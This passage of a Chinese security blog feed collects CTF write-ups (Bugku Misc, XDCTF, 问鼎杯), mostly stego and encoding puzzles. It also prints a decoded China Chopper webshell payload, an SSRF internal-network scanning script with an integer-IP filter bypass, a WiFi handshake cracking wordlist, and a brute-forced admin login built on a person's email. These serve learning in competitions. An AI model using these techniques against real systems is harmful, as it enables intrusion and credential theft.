title="下载地址">http://120.24.86.145:8002/misc/momo.jpg</a></p><p>使用binwalk可以提取出来一个rar压缩包，经过测试是真正有密码。不是伪加密。。</p><p>找了很多地方，也用工具爆破了。。没成功，忽然想起以前表哥们发的一加密压缩包的密码是汉字，尝试了下图片上的汉字。。竟然解开了。。</p><p>解压获得</p><pre><code>电报内容：..../-/-/.--./---.../-..-./-..-././-./-.-./---/-.././.-.-.-/-.-./..../.-/..../..-/---/.-.-.-/-.-./---/--/-..-.首长：我操你在逗我吗？你确定是他们纳粹发的吗？士兵：难道我弄错了？哦。。。等等是这一条内容：http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= AES Key：@#@#￥%……￥￥%%……&amp;￥士兵：二维码真的扫不出来吗？？肯定可以扫出来</code></pre><p>解码莫斯电码获得</p><pre><code>HTTP//ENCODE.CHAHUO.COM/</code></pre><p>访问后是一个解密网站，内容对应的那一个链接，直接访问是404，看样子<br>需要解密。使用key解密得</p><pre><code>momoj2j.png</code></pre><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%A6%B9%E5%AD%90%E7%9A%84%E9%99%8C%E9%99%8C-1.png"></p><p>于是乎，访问</p><pre><code>http://c.bugku.com/momoj2j.png</code></pre><p>将获得的二维码反色一下即可获得flag</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%A6%B9%E5%AD%90%E7%9A%84%E9%99%8C%E9%99%8C-2.png"></p><p>flag为</p><pre><code>KEY&#123;nitmzhen6&#125;</code></pre><h2 id="Linux基础1"><a href="#Linux基础1" class="headerlink" title="Linux基础1"></a>Linux基础1</h2><p>无脑题。。右键Notepad++打开，搜索字符串key,获得flag</p><p>flag为</p><pre><code>KEY&#123;24f3627a86fc740a7f36ee2c7a1c124a&#125;</code></pre><h2 id="图穷匕现"><a href="#图穷匕现" class="headerlink" title="图穷匕现"></a>图穷匕现</h2><p>下载图片后，右键查看属性-详细信息，获得提示</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-1.png"></p><p>根据提示，猜测在文件尾有线索，使用Winhex打开，发现类似16进制的相当长的字符串。</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-2.png"></p><p>将其复制出来，使用hackbar的16进制转字符串功能，将其转换并保存。转换出一堆坐标点。提示中有说画图，写脚本将其按照像素点的形式画出来</p><p>脚本如下</p><pre><code>#!Python3#-*-coding:utf-8-*-from PIL import Imagefile = open(&#39;data.txt&#39;,&#39;r&#39;)IM = Image.new(&quot;RGB&quot;,(272,272))for line in file:    x = line.strip().lstrip(&#39;(&#39;).rstrip(&#39;)&#39;)    tmp = x.split(&#39;,&#39;)    IM.putpixel((int(tmp[0]),int(tmp[1])),(255, 255, 255))file.close()IM.show()IM.save(&#39;re.png&#39;)</code></pre><p>画出一个二维码，扫描获得flag</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%9B%BE%E7%A9%B7%E5%8C%95%E7%8E%B0-3.png"></p><p>flag为</p><pre><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></pre><h2 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h2><p>打开txt文档，全是01..网上尝试二进制转字符串，发现开头为rar,看样子是压缩文件，使用python写脚本，将其按照8个一位的格式，写到文件里</p><p>脚本如下</p><pre><code>#!python3#-*-coding:utf-8-*-import binasciifile1 = open(&#39;convert.txt&#39;,&#39;r&#39;)s = file1.read()file2 = open(&#39;re.rar&#39;,&#39;wb&#39;)s1 = &#39;&#39;for i in range(0,len(s),8):    if ((int(s[i:i+8],2))&lt;= 15):        print(hex(int(s[i:i+8],2)))        s1 = s1 + &#39;0&#39; + hex(int(s[i:i+8],2)).replace(&#39;0x&#39;,&#39;&#39;)        print (s1)    else:        s1 += hex(int(s[i:i+8],2)).replace(&#39;0x&#39;,&#39;&#39;)file2.write(binascii.a2b_hex(s1))</code></pre><p>将写出来的rar文件打开，给了个图，叫做key.jpg。</p><p>然后使用Winhex打开，找到一串base64</p><p><img src="https://image.mengsec.com/Bugku-Misc-convert-1.png"></p><pre><code>ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0=  </code></pre><p>解码获得flag</p><pre><code>flag&#123;01a25ea3fd6349c6e635a1d0196e75fb&#125;</code></pre><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p><a href="http://123.206.31.85/files/1741be6b8da0b40baab0db1dacee5680/conf.bin" title="题目地址">题目地址</a></p><p>题目提示为</p><pre><code>flag格式：flag&#123;宽带用户名&#125;</code></pre><p>下载下来一个.bin的文件，使用NotePad++打开是乱码，看样子需要专用的工具，上网找到一款工具<br>​<br>    路由器密码查看器(RouterPassView)<br>使用工具打开，搜索Password，点几下就能找到</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%AE%BD%E5%B8%A6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2_1.png"></p><p>最终flag为</p><pre><code>flag&#123;053700357621&#125;</code></pre><h2 id="linux"><a href="#linux" class="headerlink" title="linux???"></a>linux???</h2><p><a href="http://120.24.86.145:8002/misc/1.tar.gz" title="题目地址">题目地址</a><br>直接解压文件，从里面找到一个flag文件，<br>右键NotePad++打开，搜索key,点几下查找下一个就能找到flag</p><p>flag为</p><pre><code>key&#123;feb81d3834e2423c9903f4755464060b&#125;</code></pre><h2 id="中国菜刀，不在web里？"><a href="#中国菜刀，不在web里？" class="headerlink" title="中国菜刀，不在web里？"></a>中国菜刀，不在web里？</h2><p><a href="http://120.24.86.145:8002/misc/caidao.zip" title="题目地址">题目地址</a></p><p>打开题目，给了一个数据包，既然是中国菜刀，那么过滤出所有http协议的数据来。有三条http的数据流</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_1.png"></p><p>分别追踪每一个流，找到一点线索，</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_2.png"></p><p>在第三条数据流中，解码传输的shell命令</p><pre><code>123=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&#39;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFx3d3dyb290XFxmbGFnLnRhci5neiI7JGZwPUBmb3BlbigkRiwncicpO2lmKEBmZ2V0YygkZnApKXtAZmNsb3NlKCRmcCk7QHJlYWRmaWxlKCRGKTt9ZWxzZXtlY2hvKCdFUlJPUjovLyBDYW4gTm90IFJlYWQnKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D&#39;));\&quot;);&quot;));</code></pre><p>base64解码得</p><pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&#39;5.3.0&#39;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&#39;r&#39;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&#39;ERROR:// Can Not Read&#39;);&#125;;echo(&quot;X@Y&quot;);die();÷￿ýÃ&lt;?php@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);if (PHP_VERSION &lt; &#39;5.3.0&#39;) &#123;    @set_magic_quotes_runtime(0);&#125;;echo (&quot;X@Y&quot;);$F = &quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp = @fopen($F, &#39;r&#39;);if (@fgetc($fp)) &#123;    @fclose($fp);    @readfile($F);&#125; else &#123;    echo (&#39;ERROR:// Can Not Read&#39;);&#125;;echo (&quot;X@Y&quot;);die();?&gt;</code></pre><p>看样子对flag.tar.gz进行了下载。所以服务器返回的数据中有flag，在Line-based text data右键，选择显示分组字节流，调整开始起点来除去开头的X@Y,然后将解码为改为压缩，可获取flag，如图所示</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80_3.png"></p><p>flag为</p><pre><code>key&#123;8769fe393f2b998fa6a11afe2bfcd65e&#125;</code></pre><h2 id="再来一道隐写"><a href="#再来一道隐写" class="headerlink" title="再来一道隐写"></a>再来一道隐写</h2><p><a href="http://123.206.31.85/files/b708db278f74342e35dea4fe48ebed28/58d54bd3e134e.zip" title="题目地址">题目地址</a></p><p>这题还是老套路，做题的时候binwalk和Stegsolve分析了下，没找到啥有价值的，忽然想到之前做题的时候，遇到的一个姿势——通过修改图片显示的长和宽来隐藏信息。</p><p>使用Winhex打开图片，修改对应的值即可获得flag</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E5%86%8D%E6%9D%A5%E4%B8%80%E9%81%93%E9%9A%90%E5%86%99-1.png"></p><p>flag为</p><pre><code>flag&#123;He1l0_d4_ba1&#125;</code></pre><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p><a href="http://123.206.31.85/files/49256ea124f2f47866605e1d1f352150/wifi.cap" title="题目地址">题目地址</a></p><p>题目描述</p><pre><code>flag格式：flag&#123;你破解的WiFi密码&#125;tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你1391040**Goodluck!!</code></pre><p>提示密码是手机号，先写个脚本跑个字典出来</p><pre><code>#-*-coding:utf-8-*-s = &quot;1391040&quot;t = &quot;&quot;file = open(&#39;data.txt&#39;,&#39;w&#39;)for i in range(10):    for j in range(10):        for k in range(10):            for l in range(10):                t = s + str(i) + str(j) + str(k) + str(l)                file.write(t)                file.write(&#39;\n&#39;)file.close()</code></pre><p>使用工具Aircrack-ng</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-1.png"><br><img src="https://image.mengsec.com/Bugku-Misc-%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-2.png"></p><p>flag为</p><pre><code>flag&#123;13910407686&#125;</code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XDCTF 初赛部分题目WriteUp</title>
    <link href="/2017/10/04/XDCTF-%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteUp/"/>
    <url>/2017/10/04/XDCTF-%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteUp/</url>
    
    <content type="html"><![CDATA[<p>国庆假期水了下XDCTF的初赛，最后拿了个33名，没进决赛，不过学了不少东西，记一下</p><a id="more"></a><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x01-基础为王"><a href="#0x01-基础为王" class="headerlink" title="0x01 基础为王"></a>0x01 基础为王</h3><p>从给的数据包中，可以找到两个分别名为flag-1 flag-2的图片，提取出来以后，使用Stegosolve进行一次XOR操作即可获得flag</p><p><img src="https://image.mengsec.com/XDCTF-Crypto-1.png"></p><h3 id="0x02-基础之Base64"><a href="#0x02-基础之Base64" class="headerlink" title="0x02 基础之Base64"></a>0x02 基础之Base64</h3><p>给了长长的一大串base64，解密之后是一个C程序脚本，运行出helloword..</p><p>肯定不对啊，谷歌找资料，知道为base64隐写，网上有脚本可以直接进行解密</p><p>脚本如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"># -*- coding: cp936 -*-<br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>for line in f.<span class="hljs-built_in">readlines</span>():<br>    stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(line.<span class="hljs-built_in">split</span>())<br>    rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(stegb64.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">split</span>())<br>  offset = <span class="hljs-built_in">abs</span>(b64chars.<span class="hljs-built_in">index</span>(stegb64.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.<span class="hljs-built_in">index</span>(rowb64.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>    equalnum = stegb64.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>) #no equalnum no offset<br>    if equalnum:<br>        bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].<span class="hljs-built_in">zfill</span>(equalnum * <span class="hljs-number">2</span>)<br>    print <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure><p>直接运行即可</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web就做出来一个题，比较菜/(ㄒoㄒ)/~~</p><h3 id="0x01-Web2"><a href="#0x01-Web2" class="headerlink" title="0x01 Web2"></a>0x01 Web2</h3><p>题目忘记截图了。</p><p>python用来执行系统命令的四种方法都行不通，故意引用一个不存在的模块会在错误报告中，找到绝对路径</p><pre><code>File &quot;/codes/6707603a4141a84912289293db7dcc1f/a.py&quot;</code></pre><p>而且glob模块并没有被禁用，可以借助它来列目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> glob.glob(<span class="hljs-string">r&#x27;&#x27;</span>):<br><span class="hljs-built_in">print</span> filename<br></code></pre></td></tr></table></figure><p>从绝对路径开始，往下找，flag就在codes目录中，直接open读取输出即可获得flag</p><h3 id="0x02-Web3"><a href="#0x02-Web3" class="headerlink" title="0x02 Web3"></a>0x02 Web3</h3><p>这个题目我没做出来，在此放上大表哥的flag</p><p>flag页面的URL为<code>http://web.ctf.xidian.edu.cn/web3/?file=flag.html</code>，推测为文件读取。</p><p>将flag.html改为index.php获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*//设置open_basedir</span><br><span class="hljs-comment">ini_set(&quot;open_basedir&quot;, &quot;/home/shawn/www/index/&quot;);</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$file</span> = trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;main.html&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// disallow ip</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^(http:\/\/)+([^\/]+)/i&#x27;</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$domain</span>)) &#123;<br><span class="hljs-variable">$domain</span> = <span class="hljs-variable">$domain</span>[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$domain</span>, <span class="hljs-string">&quot;.&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>( @file_get_contents(<span class="hljs-variable">$file</span>)!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$file</span>);<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br></code></pre></td></tr></table></figure><p>在这里卡了很久，最后推测是ssrf，通过读取<code>/etc/hosts</code>文件得知内网ip为<code>172.18.0.3</code>。</p><p>由于正则表达式过滤了形如<code>127.0.0.1</code>的ip，使用整形ip来代替，扫描内网。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs processing">#-*- coding:utf<span class="hljs-number">-8</span> -*-<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>ip = <span class="hljs-string">&#x27;172.18.0.%d&#x27;</span> % i<br>int_ip = <span class="hljs-built_in">int</span>(socket.inet_aton(ip).encode(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-number">16</span>)<br>#<span class="hljs-built_in">print</span> int_ip<br>r = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://web.ctf.xidian.edu.cn/web3/?file=&#x27;</span>+urllib.quote_plus(<span class="hljs-string">&#x27;http://%d&#x27;</span> % int_ip))<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in r.<span class="hljs-built_in">text</span>:<br><span class="hljs-built_in">print</span> ip, int_ip<br><span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span><br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>172.18.0.2有flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">172.18.0.2 2886860802</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;white&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>nginx/1.13.5<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- do u see me? ha flag</span></span><span class="hljs-template-variable">&#123;0e34c0321b2b3048d399b41a8ffda584&#125;</span><span class="xml"><span class="hljs-comment"> --&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-邮箱"><a href="#0x01-邮箱" class="headerlink" title="0x01 邮箱"></a>0x01 邮箱</h3><p>根据提示</p><p>小黑发现一个有趣的博客，于是注册了一个账号，你能找到他的邮箱地址吗？<br>注意：直接递交邮箱地址即可。</p><p>打开数据包后，查找含有 register 的数据流</p><pre><code>http contains &quot;register&quot;</code></pre><p><img src="https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-1.png"></p><p>分别进行追踪流操作，经过尝试可以获得flag</p><p><img src="https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-2.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
      <tag>XDCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2017-问鼎杯预赛-部分题目Writeup</title>
    <link href="/2017/09/18/2017-%E9%97%AE%E9%BC%8E%E6%9D%AF%E9%A2%84%E8%B5%9B-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/"/>
    <url>/2017/09/18/2017-%E9%97%AE%E9%BC%8E%E6%9D%AF%E9%A2%84%E8%B5%9B-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/</url>
    
    <content type="html"><![CDATA[<p>在火车上比的，就做了一部分题目，由于没有足够的时间做题，也没能进决赛/(ㄒoㄒ)/~~</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x01-老眼昏花"><a href="#0x01-老眼昏花" class="headerlink" title="0x01 老眼昏花"></a>0x01 老眼昏花</h3><p>直接点击链接进入，提示</p><pre><code>Can you tell me what year is this? Year is not true.</code></pre><p>尝试使用get传一个year的参数</p><pre><code>http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2017</code></pre><p>又提示</p><pre><code>Can you tell me what year is this? Yes this year is 2017, but you can&#39;t input 7 in fact.</code></pre><p>要求输入的不能有7，尝试一下浮点数</p><pre><code>http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999999999999999999999999999999999999999999999999999</code></pre><p>直接访问即可获得flag</p><h3 id="0x02-轻而易举"><a href="#0x02-轻而易举" class="headerlink" title="0x02 轻而易举"></a>0x02 轻而易举</h3><p>这个题是个社工题，一开始没人做出来，直到主办方给了提示</p><p>根据文章下面的作者找到后台地址<br>/fuckme/index.php<br>直接根据文章中提供的信息，可以暴力破解出：</p><pre><code>后台账号名为翟欣欣的qq邮箱847085251@qq.com密码为车牌号NB51A5</code></pre><p>直接登录，在其中文章中有两篇待审核，其中一篇的下面有一个</p><pre><code>From [/b7010bcfcdb62922d4e4a5ec8d79fb33.php](/b7010bcfcdb62922d4e4a5ec8d79fb33.php)</code></pre><p>直接将其加载网址后面访问即可获得flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-画风不一样的喵"><a href="#0x01-画风不一样的喵" class="headerlink" title="0x01 画风不一样的喵"></a>0x01 画风不一样的喵</h3><p>下载下来是一张图片，修改扩展名，得到一个压缩包，解压出来得到两张看起来相同的图片还有一个tips.txt，</p><pre><code>Although two days doing the same things, but day2 has a secret than day1-。-</code></pre><p>这种两张图片的题上一次在某竞赛中出现过，当时不了解盲水印攻击没做出来，这次有了经验，直接上脚本，配合命令：</p><pre><code>python bwm.py decode day1.png day2.png test1.png</code></pre><p>得到一张flag<br><img src="https://image.mengsec.com/test1.png"></p><h3 id="0x02-古典密码"><a href="#0x02-古典密码" class="headerlink" title="0x02 古典密码"></a>0x02 古典密码</h3><p>这个题主要考察字频统计攻击，上“<a href="https://quipqiup.com/">求pa</a>”网站在线解密</p><p><img src="https://image.mengsec.com/QQ%E6%88%AA%E5%9B%BE20170916201404.png" alt="1"></p><p>提交getflag</p><h3 id="0x03-瞒天过海"><a href="#0x03-瞒天过海" class="headerlink" title="0x03 瞒天过海"></a>0x03 瞒天过海</h3><p>只有一个名为++__++的文件，用winhex分析了一下发现是个数据包，导出了一个flag.rar的压缩包，里面有个flag.txt，但是加密了。<br><img src="https://image.mengsec.com/QQ%E6%88%AA%E5%9B%BE20170916174625.png"><br>没办法只能继续找线索。在导出http数据流的时候发现了个py脚本，拖出来跑一下得到<code>passwd=&#123;No_One_Can_Decrypt_Me&#125;</code>，输入密码解出flag.txt ： <code>WDCTF&#123;Seclab_CTF_2017&#125;</code></p><h3 id="0x04-小菜一碟"><a href="#0x04-小菜一碟" class="headerlink" title="0x04 小菜一碟"></a>0x04 小菜一碟</h3><p>给了一张二维码gif，分离出四张图片，拼接一下得到一张二维码，扫码得到一堆十六进制，放入winhex保存为.pyc文件，pyc反编译py得到一个py脚本：</p><pre><code>#!/usr/bin/env python# encoding: utf-8# 访问 http://tool.lu/pyc/ 查看更多信息import randomkey = &#39;ctf&#39;strr = &#39;186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43&#39;def func1(str1, key):    random.seed(key)    str2 = &#39;&#39;    for c in str1:        str2 += str(ord(c) ^ random.randint(0, 255)) + &#39;,&#39;        str2 = str2.strip(&#39;,&#39;)    return str2</code></pre><p>​<br>    def func2(str2, key):<br>        random.seed(key)<br>        str1 = ‘’<br>        for i in str2.split(‘,’):<br>            i = int(i)<br>            str1 += chr(i ^ random.randint(0, 255))</p><pre><code>    return str1print &quot;func1:&quot;+func1(strr, key)+&quot;\n&quot;print &quot;func2:&quot;+func2(strr, key)+&quot;\n&quot;print &quot;func1(func2):&quot;+func2(func1(strr, key), key)</code></pre><p>其中func1()是加密函数，func2()是解密函数，strr中的内容是经过第一个函数加密后的字符串，所以我们只需要加上一句<code>print func2(strr, key)</code></p><p>运行一下就可以得到`flag{U_r_Greatt!}</p><p>PS：Windows和Linux中python生成随机数机制有问题，这个代码只有在Linux下运行才可以获得flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
      <tag>问鼎杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FineCMS v5.0.9 代码审计</title>
    <link href="/2017/09/11/FineCMS-v5-0-9-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2017/09/11/FineCMS-v5-0-9-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
